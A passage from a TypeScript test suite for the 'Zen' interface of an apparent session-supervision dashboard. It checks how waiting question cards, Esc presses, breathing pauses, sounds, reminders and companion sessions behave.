		assert.deepEqual(choices.map((c) => c.disabled), choices.map(() => offline), offline ? "no trust answer while offline" : "answerable while online");
	}
});

test("a unit that waits with no dialog has its last line, Not now, and Open the terminal, with no composer", async () => {
	const r = rig({ start: null });
	r.feed(net([unit("a", "waiting", { name: "docs-main", since: 5 })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.ok(r.text().includes("I need a decision."));
	assert.equal(r.calls.composers.length, 0);
	assert.ok(r.button("Maybe later"));
	r.button("Open the terminal")!.click();
	await new Promise((done) => setImmediate(done)); // the page's terminals come behind their chunk
	assert.deepEqual([r.calls.leave, r.calls.embeds], [[], ["a"]]);
});

test("an accepted answer plays the knock, shows its outcome for 1.2 s, then the pause, then the companion; the item does not come back at once", async () => {
	const r = rig();
	const n = net([unit("a", "waiting", { since: 5, pending: select({ cancel: true }) })]);
	r.feed(n);
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
	r.button("Send answer")!.click();
	await r.reply(ok);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	assert.ok(r.text().includes("Answered."), "the card stays with its outcome");
	assert.ok(r.button("Maybe later")!.disabled, "and takes no second answer");
	r.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true }) })])); // the snapshot before the unit moved on
	await r.advance(1300);
	assert.equal(r.by((el) => el.getAttribute("role") === "img")[0]?.getAttribute("aria-label"), "Take a breath", "the pause is the breathing circle");
	const going = r.by((el) => el.dataset.gone !== undefined);
	assert.equal(going.length, 1, "the answered card dissolves like ink for a moment");
	assert.equal(going[0]!.getAttribute("inert"), "", "and takes no input meanwhile");
	await r.advance(1500);
	assert.equal(r.button("Maybe later"), undefined);
	assert.equal(r.by((el) => el.dataset.gone !== undefined).length, 0, "then it is gone");
	await r.advance(1600);
	assert.equal(r.calls.sound.length, 2, "no second bowl for the answered item");
	assert.ok(r.text().includes("tower") || r.calls.composers.length === 1, "the companion shows");
	assert.equal(r.calls.composers.at(-1)!.key, "t");
});

test("a refused answer plays the low bowl and keeps the card; the item's later exit is silent", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
	r.button("Send answer")!.click();
	await r.reply({ outcome: "rejected", reason: "digest" });
	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
	assert.ok(r.text().includes("The question changed; read it again."), "the card says why");
	assert.ok(r.button("Send answer"), "and stays");
	r.feed(net([unit("a", "working", { since: 9 })])); // the stale item leaves by itself
	assert.deepEqual(r.calls.sound, ["bowl", "low"], "that exit plays nothing");
});

test("Not now rests the item without a sound, a pause follows, and the item returns with the bowl after ten minutes", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Maybe later")!.click();
	assert.deepEqual(r.calls.sound, ["bowl"]);
	await r.advance(3100);
	assert.equal(r.button("Maybe later"), undefined, "the companion shows, not the rested item");
	await r.advance(9 * 60_000);
	assert.equal(r.button("Maybe later"), undefined);
	await r.advance(60_000);
	assert.equal(r.button("Maybe later"), undefined, "the rest is over, and the card waits for Enter: it does not take the screen by itself");
	assert.deepEqual(r.calls.sound, ["bowl"], "no sound for it");
	r.z.key("talk");
	await r.settle();
	assert.ok(r.button("Maybe later"), "back, in its place by age");
	assert.deepEqual(r.calls.sound, ["bowl", "bowl"]);
});

test("an item that stops waiting by itself plays the knock and says it was answered elsewhere", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.feed(net([unit("a", "working", { since: 9 })]));
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	assert.ok(r.text().includes("Already answered elsewhere"));
});

test("an outcome line fades in when it is first said, and the same words again do not restart it", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const out = r.by((el) => el.getAttribute("class") === "zen-out")[0]!;
	assert.equal(out.getAttribute("data-fade"), null, "no outcome, no fade");
	r.feed(net([unit("a", "working", { since: 9 })]));
	assert.ok(r.text().includes("Already answered elsewhere"));
	assert.notEqual(out.getAttribute("data-fade"), null, "the outcome line fades in");
});

test("the page never says how many items wait or that more do: what it draws is the same with one, two, and five waiting, and names no other unit", async () => {
	const NAMES = ["alpha", "bravo", "charlie", "delta", "echo"];
	const shots = new Map<number, { card: string; pause: string }>();
	for (const count of [1, 2, 5]) {
		const r = rig();
		r.feed(net(NAMES.slice(0, count).map((name, i) => unit(name, "waiting", { name, since: 5 + i, pending: select() }))));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		const card = [r.root.dump(), r.text()].join(" ");
		for (const other of NAMES.slice(1, count)) assert.ok(!card.includes(other), `${other} is not on the screen`);
		assert.ok(!/queue|more|also|others|waiting/i.test(card), `no queue word (${count})`);
		r.button("Maybe later")!.click();
		await r.settle();
		shots.set(count, { card, pause: [r.root.dump(), r.text()].join(" ") });
		await r.advance(3100);
		if (count > 1) {
			assert.ok(!r.root.dump().includes("bravo"), "the next one does not come by itself");
			r.z.key("talk");
			await r.settle();
			assert.ok(r.root.dump().includes("bravo"), "it comes by Enter");
		}
	}
	assert.equal(shots.get(2)!.card, shots.get(1)!.card, "the card is the same with another waiting behind it");
	assert.equal(shots.get(5)!.card, shots.get(1)!.card);
	assert.equal(shots.get(2)!.pause, shots.get(1)!.pause, "so is the pause");
	assert.equal(shots.get(5)!.pause, shots.get(1)!.pause);
});

/** An Esc as the page gives it to the layer; `held` makes it a repeat of a key held down. */
const esc = (r: { z: { escape(e: { preventDefault(): void; repeat?: boolean }): boolean } }, held = false) => {
	let prevented = 0;
	const took = r.z.escape({ preventDefault: () => void prevented++, repeat: held });
	return { took, prevented };
};

test("Esc on an item cancels its question when it can be cancelled (the card's own Cancel), else it is Not now: the next card follows the cancel; it never leaves", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() }), unit("b", "waiting", { since: 9, name: "bravo", pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const out = esc(r);
	assert.deepEqual([out.took, out.prevented], [true, 1], "Zen takes it and the page goes nowhere");
	assert.deepEqual(r.calls.posts.map((p) => [p.key, p.action, p.body.cancel, p.body.dialog]), [["a", "answer", true, "q1"]], "the same body as the Cancel button");
	await r.reply(ok);
	assert.deepEqual(r.calls.leave, []);
	await r.advance(1300);
	assert.ok(r.text().includes("bravo"), "the next card follows the boss's own cancel directly (Z-D22), with no pause between");
	assert.equal(liveCard(r)!.all((el) => el.classes.has("ask-cancel")).length, 0, "this one has no Cancel (the card before it, dissolving, did)");
	await r.advance(401); // the card the chain took holds off an Esc for 400 ms (Z-D22)
	esc(r);
	assert.equal(r.calls.posts.length, 1, "so Esc is Not now: nothing is sent");
	assert.ok(r.by((el) => el.getAttribute("role") === "img").length, "the item rests and the pause starts");
	assert.deepEqual(r.calls.leave, [], "Esc on an item never leaves");
});

test("Esc on a card whose answer is on its way, or with its outcome showing, is not a second cancel: it counts toward leaving instead", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	esc(r);
	await r.reply(ok);
	assert.equal(r.calls.posts.length, 1);
	esc(r);
	assert.equal(r.calls.posts.length, 1, "the outcome is showing: no second cancel");
	assert.deepEqual(r.calls.leave, [], "one Esc is only the hint");
	assert.equal(r.by((el) => el.dataset.on !== undefined && el.getAttribute("class") === "zen-esc").length, 1, "the quiet line shows");
});

test("a field with text takes the first Esc as a blur (the text stays); an empty one is let go of on the companion's screen, and on a card Esc goes on to the card", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const own = r.by((el) => el.tagName === "textarea")[0]!;
	own.focus();
	own.type("and the on-call");
	esc(r);
	assert.notEqual(page.focused, own, "blurred");
	assert.equal(own.value, "and the on-call", "the text stays");
	assert.deepEqual([r.calls.leave, r.calls.posts], [[], []], "nothing else happened");
	own.focus(); // an empty field on a card does not stand in the way
	own.value = "";
	esc(r);
	assert.equal(r.calls.posts.length, 1, "the card's question is cancelled");
	const idle = rig();
	idle.feed(net([unit("m", "working")]));
	idle.z.show();
	await idle.settle();
	idle.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await idle.settle();
	const box = idle.calls.composers[0]!.box;
	box.focus();
	esc(idle);
	assert.notEqual(page.focused, box, "an empty box is let go of");
	assert.equal(idle.by((el) => el.getAttribute("class") === "zen-esc" && el.dataset.on !== undefined).length, 0, "and no hint: the key was taken");
	box.focus();
	box.type("half a thought");
	esc(idle);
	assert.notEqual(page.focused, box);
	assert.equal(box.value, "half a thought");
	assert.deepEqual(idle.calls.leave, []);
});

test("on the companion, the empty state, and the pause one Esc does nothing but show the line; a second within 600 ms leaves, a later one starts again", async () => {
	const idle = rig();
	idle.feed(net([unit("m", "working")]));
	idle.z.show();
	await idle.settle();
	idle.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await idle.settle();
	const hint = () => idle.by((el) => el.getAttribute("class") === "zen-esc")[0]!;
	assert.equal(hint().textContent, "");
	esc(idle);
	assert.deepEqual(idle.calls.leave, [], "one Esc does not leave");
	assert.equal(hint().textContent, "Press Esc again to leave Zen");
	assert.notEqual(hint().dataset.on, undefined);
	await idle.advance(599);
	esc(idle);
	assert.deepEqual(idle.calls.leave, [{ route: { view: "session", ws: "w", key: "t" } }], "the second within 600 ms leaves for the companion's session");
	assert.equal(hint().textContent, "", "the line goes");
	const slow = rig();
	slow.feed(net([unit("m", "working")]));
	slow.z.show();
	await slow.settle();
	slow.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await slow.settle();
	esc(slow);
	await slow.advance(601);
	assert.equal(slow.by((el) => el.getAttribute("class") === "zen-esc")[0]!.dataset.on, undefined, "the line fades with the window");
	await slow.advance(400);
	assert.equal(slow.by((el) => el.getAttribute("class") === "zen-esc")[0]!.textContent, "", "and its words go after the fade");
	esc(slow);
	assert.deepEqual(slow.calls.leave, [], "a second after the window is a first again");
	const empty = rig();
	empty.feed(net([unit("m", "working")], [], false));
	empty.z.show();
	await empty.settle();
	empty.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await empty.settle();
	esc(empty);
	esc(empty);
	assert.deepEqual(empty.calls.leave, [{}], "the empty state leaves for the page");
	const pause = rig();
	pause.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	pause.z.show();
	await pause.settle();
	pause.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await pause.settle();
	pause.button("Maybe later")!.click();
	esc(pause);
	assert.deepEqual(pause.calls.leave, []);
	esc(pause);
	assert.deepEqual(pause.calls.leave, [{}], "a pause just returns to the page");
});

test("a held Esc repeats into nothing; another key taken between two Esc breaks the pair; Esc in the menu closes the menu only", async () => {
	const r = rig();
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	esc(r);
	assert.deepEqual([esc(r, true).took, r.calls.leave], [true, []], "a repeat is no second press");
	const box = r.calls.composers[0]!.box;
	box.focus();
	esc(r);
	esc(r);
	assert.deepEqual(r.calls.leave, [], "a blur between the two took one of them: the pair starts over");
	const menu = r.by((el) => el.getAttribute("class") === "zen-menubtn")[0]!;
	menu.click();
	esc(r);
	assert.equal(r.by((el) => el.getAttribute("class") === "zen-menu")[0]!.hidden, true, "the menu closed");
	assert.deepEqual(r.calls.leave, [], "and nothing else");
	esc(r);
	esc(r);
	assert.equal(r.calls.leave.length, 1, "the next two leave");
});

test("Esc is Zen's only while it shows: a hidden layer lets the page have it", async () => {
	const r = rig();
	r.feed(net([unit("m", "working")]));
	assert.equal(esc(r).took, false, "not yet shown");
	r.z.show();
	await r.settle();
	r.z.hide();
	assert.equal(esc(r).took, false, "hidden again");
});

test("a hidden page's pause ends when the page is shown; a tap ends the pause", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Maybe later")!.click();
	r.z.visible(false);
	await r.advance(5000);
	assert.ok(r.by((el) => el.getAttribute("role") === "img").length, "still the pause: no one was there to breathe");
	r.z.visible(true);
	assert.equal(r.by((el) => el.getAttribute("role") === "img").length, 0, "shown: it ends at once");
	const tap = rig();
	tap.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	tap.z.show();
	await tap.settle();
	tap.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await tap.settle();
	tap.button("Maybe later")!.click();
	assert.ok(tap.by((el) => el.getAttribute("role") === "img").length);
	tap.root.bubble("pointerdown");
	assert.equal(tap.by((el) => el.getAttribute("role") === "img").length, 0, "a tap skips it");
});

test("a question that arrives while the page is hidden and the pause of the last card is on does not draw its card: the pause is over and it waits for Enter, one that reuses the answered id too (LCL-F002)", async () => {
	for (const id of ["d9", "d1"]) {
		const r = rig();
		r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		r.button("Maybe later")!.click();
		r.z.visible(false);
		r.feed(net([unit("b", "waiting", { since: 9, pending: select({ dialog: id }) })]));
		await r.settle();
		assert.equal(r.by((el) => el.getAttribute("role") === "img").length, 0, `${id}: the pause is over, the circle is gone`);
		assert.equal(r.by((el) => el.getAttribute("role") === "radio").length, 0, `${id}: the card is not drawn`);
		assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", `${id}: it waits for Enter`);
		r.z.visible(true);
		r.z.key("talk");
		await r.settle();
		assert.ok(r.by((el) => el.getAttribute("role") === "radio").length, `${id}: Enter takes it`);
	}
});

test("a hidden or unfocused page gets one reminder for each card that arrives, behind a card too, and no card is drawn; a page that is in front needs none (Z-D20)", async () => {
	const r = rig();
	page.hidden = true;
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 6, pending: select({ dialog: "d2" }) })]));
	r.z.show();
	await r.settle();
	assert.deepEqual(r.calls.remind, ["a", "b"], "each card that waits is reminded of once, and none is drawn");
	assert.equal(cards(r), 0);
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 6, pending: select({ dialog: "d2" }) }), unit("d", "waiting", { since: 8, pending: select({ dialog: "d4" }) })]));
	assert.deepEqual(r.calls.remind, ["a", "b", "d"], "a later arrival raises one more, and the others none again");
	const seen = rig();
	page.hidden = false;
	seen.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	seen.z.show();
	await seen.settle();
	seen.z.key("talk");
	await seen.settle();
	assert.deepEqual(seen.calls.remind, [], "a page that is in front needs no reminder");
	page.hidden = false;
});

test("a card answers only while the link is live: offline its choices are disabled, online they are not", async () => {
	for (const offline of [true, false]) {
		const r = rig({ offline });
		r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		const choices = r.by((el) => el.getAttribute("role") === "radio");
		assert.ok(choices.length);
		assert.deepEqual(choices.map((c) => c.disabled), choices.map(() => offline), offline ? "no answer while offline" : "answerable while online");
	}
});

test("the companion's composer sends by the fixture's route for its key, and is told its unit's facts: control, live, and the link", async () => {
	for (const offline of [false, true]) {
		const r = rig({ offline });
		r.feed(net([unit("m", "working")]));
		r.z.show();
		await r.settle();
		const c = r.calls.composers.at(-1)!;
		void (c.post as unknown as (a: string, b: Record<string, unknown>) => Promise<unknown>)("answer", { dialog: "x" });
		assert.deepEqual(r.calls.posts.map((p) => [p.key, p.action]), [["t", "answer"]], "the fixture's route, for the companion's key");
		const facts = c.updates.at(-1) as { control: boolean; live: boolean; online: boolean; ally: boolean; run: boolean };
		assert.deepEqual([facts.control, facts.live, facts.online, facts.ally, facts.run], [true, true, !offline, false, false]);
	}
});

test("the companion: the tower the boss last wrote to, its log and composer, the stream watching its key, history for its key only; an item that arrives waits, the boss typing or not (Z-D20)", async () => {
	const r = rig();
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	assert.deepEqual(r.calls.sound, [], "the companion comes in silently");
	assert.equal(r.calls.composers.at(-1)!.key, "t");
	assert.equal(r.calls.watch.at(-1), "t", "the stream is asked for the companion's session");
	assert.equal(r.calls.logs.length, 1);
	r.z.history({ key: "t", reset: true, items: [] } as HistoryEvent);
	r.z.history({ key: "other", items: [] } as HistoryEvent);
	assert.deepEqual(r.calls.applied.map((e) => e.key), ["t", "t"], "the fetched newest page, then the stream's event; none for the other key");
	// The boss types in the companion's box: an item that becomes eligible waits, and it waits after he has stopped too.
	const box = r.calls.composers.at(-1)!.box;
	box.focus();
	box.value = "half a sentence";
	box.bubble("keydown");
	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
	await r.advance(600);
	assert.equal(r.button("Maybe later"), undefined, "the item waits");
	assert.deepEqual(r.calls.sound, []);
	box.value = "";
	box.bubble("input");
	await r.advance(60_000);
	assert.equal(r.button("Maybe later"), undefined, "it does not take the screen when the box empties, nor a minute later: the boss takes it");
	assert.deepEqual(r.calls.sound, []);
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "the companion's screen says so, under the name");
	assert.equal(r.calls.watch.at(-1), "t", "and the stream still watches the companion");
});

/** Time passes in the half seconds the layer polls a held screen at. */
const wait = async (r: { advance(ms: number): Promise<void> }, ms: number) => {
	for (let left = ms; left > 0; left -= 500) await r.advance(Math.min(500, left));
};

test("scrolling and tapping the log change nothing: a draft in the box, a tap (the box loses the focus), a wheel, a drag, and a touch never hand the arriving card the screen, however long", async () => {
	const r = rig();
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	const box = r.calls.composers.at(-1)!.box, log = r.by((el) => el.getAttribute("class") === "zen-log")[0]!;
	box.focus();
	box.type("half a sentence");
	box.bubble("keydown"); // typing is keys
	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
	await r.advance(600);
	assert.equal(r.button("Maybe later"), undefined, "the item waits while he types");
	box.blur(); // a tap, or a click on the scroll bar, takes the focus off the box
	log.bubble("pointerdown");
	await r.advance(1000);
	assert.equal(r.button("Maybe later"), undefined, "a tap on the log does not hand the screen over");
	for (let i = 0; i < 8; i++) {
		for (const type of ["wheel", "touchstart", "pointerdown"]) log.bubble(type);
		await r.advance(5000);
	}
	await r.advance(60_000);
	assert.equal(r.button("Maybe later"), undefined, "nor does scrolling it, or leaving it alone, for however long");
	assert.deepEqual(r.calls.sound, [], "and nothing makes a sound");
	assert.equal(box.value, "half a sentence", "the draft is where he left it");
	assert.deepEqual(r.calls.leave, [], "nothing is left or opened");
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
});

test("with no draft in the box a tap on the log is nothing: no item is waiting to take the screen, and the screen does not change", async () => {
	const r = rig();
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	const box = r.calls.composers.at(-1)!.box, log = r.by((el) => el.getAttribute("class") === "zen-log")[0]!;
	box.focus();
	box.blur();
	for (const type of ["pointerdown", "wheel", "scroll", "touchstart"]) log.bubble(type); // a scroll alone is nothing
	await wait(r, 2000);
	assert.equal(r.by((el) => el.getAttribute("class") === "zen-company").length, 1, "still the companion");
	assert.deepEqual([r.calls.sound, r.calls.leave], [[], []]);
});

test("the companion a visit starts with wins while the net lists it live; without one, nothing waits shows the circle and the line", async () => {
	const r = rig({ start: { key: "m", ws: "w" } });
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	assert.equal(r.calls.composers.at(-1)!.key, "m");
	const alone = rig();
	alone.feed(net([unit("m", "working")], [], false));
	alone.z.show();
	await alone.settle();
	assert.ok(alone.by((el) => el.getAttribute("class") === "zen-line").length === 1, "one quiet line under the circle");
	assert.ok(!alone.text().includes("Nothing waits"), "no headline");
	assert.equal(alone.calls.composers.length, 0);
	assert.equal(alone.calls.watch.at(-1), null);
});

test("no tower stands in (Z-D12): nothing to start with, or a start session that ended, shows the circle and its line with towers in the net; ] from the circle picks the first candidate", async () => {
	const none = rig({ start: null, z4b: true });
	none.feed(net([unit("m", "idle")]));
	none.z.show();
	await none.settle();
	assert.equal(none.calls.composers.length, 0, "no companion: the tower is not one");
	assert.equal(none.by((el) => el.getAttribute("class") === "zen-line").length, 1, "the circle's line");
	assert.equal(none.calls.watch.at(-1), null);
	assert.equal(none.z.cycle(1), true, "] from the circle steps to a companion");
	await none.settle();
	assert.ok(none.calls.composers.length > 0, "the stepped one opens its log and composer");
	const ended = rig({ start: { key: "m", ws: "w" } });
	ended.feed(net([unit("m", "working")]));
	ended.z.show();
	await ended.settle();
	assert.equal(ended.calls.composers.at(-1)!.key, "m");
	ended.feed(net([unit("m", "done", { ended: true })]));
	await ended.settle();
	assert.equal(ended.by((el) => el.getAttribute("class") === "zen-line").length, 0, "an ended companion no longer gives the circle by itself (Z-D20): it stays on the screen");
	assert.equal(ended.calls.watch.at(-1), "m", "and the tower does not stand in");
	assert.equal(ended.z.key("talk"), false, "no card to take, no circle to call the head back from");
});

// Z-D20 R2 (boss 2026-11-06, 「永遠不要打斷」): the session for company that ends or loses control stays on the screen with a quiet line and its input off, until the boss leaves it (Esc, Back to the breath, or the circle).
const noteOfCompany = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("zen-company-note"))[0]?.textContent;
const companyLeft = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("zen-company-rest") && !el.hidden)[0];
test("Z-D20 R2: a session for company that ended or lost control stays with its log, a quiet note, and its composer off; a snapshot that has it again clears the note", async () => {
	for (const [name, gone, said] of [["ended", net([unit("m", "done", { ended: true })]), m.zen_company_ended], ["gone from the net", net([]), m.zen_company_ended], ["lost control", net([unit("m", "working", { control: false })]), m.zen_company_lost]] as const) {
		const r = rig({ start: { key: "m", ws: "w" } });
		r.feed(net([unit("m", "working")]));
		r.z.show();
		await r.settle();
		assert.equal(noteOfCompany(r), "", name);
		const composers = r.calls.composers.length;
		r.feed(gone);
		await r.settle();
		assert.equal(r.calls.composers.length, composers, `${name}: the same composer, not a new screen`);
		assert.equal(r.by((el) => el.classes.has("zen-line")).length, 0, `${name}: no circle took its place`);
		assert.equal(noteOfCompany(r), said(), name);
		assert.ok(companyLeft(r), `${name}: the way back to the breath`);
		const facts = r.calls.composers.at(-1)!.updates.at(-1) as { live: boolean; control: boolean };
		assert.ok(!facts.live || !facts.control, `${name}: the composer is told it cannot send (its own words say why)`);
		await r.advance(10 * 60_000);
		assert.equal(noteOfCompany(r), said(), `${name}: ten minutes later it is still there`);
		if (name === "lost control") {
			r.feed(net([unit("m", "working")]));
			await r.settle();
			assert.equal(noteOfCompany(r), "", "the session is back: the note goes");
			assert.ok(!companyLeft(r));
		}
	}
});

test("ZNR (R2 'input off'): a session that lost control keeps its draft but its box is read-only, its Send off; the box takes typing again when control returns", async () => {
	const r = rig({ start: { key: "m", ws: "w" } });
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	const box = r.calls.composers.at(-1)!.box as unknown as { readOnly?: boolean };
	assert.equal(Boolean(box.readOnly), false, "a live session takes typing");
	r.feed(net([unit("m", "working", { control: false })]));
	await r.settle();
	assert.equal(box.readOnly, true, "control lost: the box is read-only, the draft stays");
	assert.deepEqual((r.calls.composers.at(-1)!.updates.at(-1) as { control: boolean }).control, false, "and its Send is off (the composer's own words say why)");
	r.feed(net([unit("m", "working")]));
	await r.settle();
	assert.equal(box.readOnly, false, "control back: the box takes typing again");
});

test("Z-D20 R2: the boss leaves a session that ended by Back to the breath, by Esc, or by the circle (]), and by nothing else", async () => {
	const ended = async () => {
		const r = rig({ start: { key: "m", ws: "w" }, z4b: true });
		r.feed(net([unit("m", "working")]));
		r.z.show();
		await r.settle();
		r.feed(net([unit("m", "done", { ended: true })]));
		await r.settle();
		return r;
	};
	const circle = (r: ReturnType<typeof rig>) => r.by((el) => el.getAttribute("class") === "zen-line").length === 1;
	const a = await ended();
	companyLeft(a)!.click();
	await a.settle();
	assert.ok(circle(a), "Back to the breath");
	const b = await ended();
	assert.equal(escape(b), true);
	await b.settle();
	assert.ok(circle(b), "Esc is one press: nothing is left to hint at");
	const c = await ended();
	assert.equal(c.z.cycle(1), true);
	await c.settle();
	assert.ok(!companyLeft(c) || noteOfCompany(c) === "", "] steps on to another session or the circle");
	const d = await ended();
	d.z.key("talk");
	d.feed(net([unit("m", "done", { ended: true })]));
	await d.advance(60_000);
	assert.equal(noteOfCompany(d), m.zen_company_ended(), "nothing else ever takes it from the boss: not time, not a snapshot, not Enter");
});

test("the companion always has its log: the newest page is fetched and applied as a reset when no history event came, and not when one did (Z3R-F001)", async () => {
	const r = rig();
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	assert.deepEqual(r.calls.applied.map((e) => [e.key, e.reset, e.items?.length]), [["t", true, 1]], "the stream already watched this key: no reset came, so the log loads itself");
	const fed = rig();
	fed.feed(net([unit("m", "working")]));
	fed.z.history({ key: "t", reset: true, items: [] } as HistoryEvent);
	fed.z.show();
	fed.z.history({ key: "t", reset: true, items: [] } as HistoryEvent);
	await fed.settle();
	assert.deepEqual(fed.calls.applied.map((e) => e.reset), [true], "a reset from the stream is the log; nothing is fetched on top of it");
});

test("Enter and Space end the pause wherever the focus is, the circle takes it, and Enter on the corner control leaves instead (Z3R-F002)", async () => {
	for (const key of ["Enter", " "]) {
		const r = rig();
		r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		r.button("Maybe later")!.click();
		const circle = r.by((el) => el.getAttribute("role") === "img")[0]!;
		assert.equal(page.focused, circle, "the focus lands on the layer for the pause");
		assert.equal((circle as unknown as { tabIndex: number }).tabIndex, -1, "focusable by script, out of the tab order");
		assert.equal(press(r.z, page.focused, key), true, `${JSON.stringify(key)} is taken`);
		assert.equal(r.by((el) => el.getAttribute("role") === "img").length, 0, `${JSON.stringify(key)} ends it`);
		assert.equal(r.z.tap(), false, "and with no pause shown the layer leaves the key alone");
	}
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Maybe later")!.click();
	const corner = r.by((el) => el.getAttribute("class") === "zen-leave")[0]!;
	corner.focus();
	assert.equal(press(r.z, corner, "Enter"), false, "the button keeps its Enter");
	assert.ok(r.by((el) => el.getAttribute("role") === "img").length, "the pause stands");
	assert.equal(press(r.z, undefined, "Enter"), true, "the focus on the page itself: it still ends the pause");
	const open = rig();
	open.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	open.z.show();
	await open.settle();
	open.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await open.settle();
	open.button("Maybe later")!.click();
	open.z.terminal({ key: "a" } as never);
	await new Promise((done) => setImmediate(done)); // the page's terminals come behind their chunk
	assert.equal(press(open.z, undefined, " "), false, "the terminal layer has the keys");
});

test("a words-only item is a pane blocked on a terminal prompt: it says to answer in its terminal, opens it, and has no composer (Z3RR-F001)", async () => {
	const r = rig({ start: null });
	r.feed(net([unit("a", "waiting", { name: "docs-main", since: 5 })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.calls.composers.length, 0, "no box to type into: the server refuses input to a blocked pane");
	assert.ok(r.text().includes("answer it in its terminal"));
	r.button("Open the terminal")!.click();
	await new Promise((done) => setImmediate(done)); // the page's terminals come behind their chunk
	assert.deepEqual([r.calls.leave, r.calls.embeds], [[], ["a"]], "it opens in Zen's own terminal layer, never Standard");
});

test("a live append that arrives while the newest page is in flight is not lost; a page for a companion that was left is dropped (Z3RR-F002, M3)", async () => {
	let release!: (p: { items: Item[] }) => void;
	const r = rig({ latest: () => new Promise((done) => (release = done)) });
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	const added = { key: "t", items: [{ id: "n1", kind: "assistant", text: "new" }] } as unknown as HistoryEvent;
	r.z.history(added);
	release({ items: [] });
	await r.settle();
	assert.deepEqual(r.calls.applied.map((e) => [e.reset ?? false, e.items?.length]), [[false, 1], [true, 0], [false, 1]], "the append is applied again after the page replaced the log");
	const gone = rig({ latest: () => new Promise((done) => (release = done)) });
	gone.feed(net([unit("m", "working")]));
	gone.z.show();
	await gone.settle();
	gone.z.hide();
	release({ items: [] });
	await gone.settle();
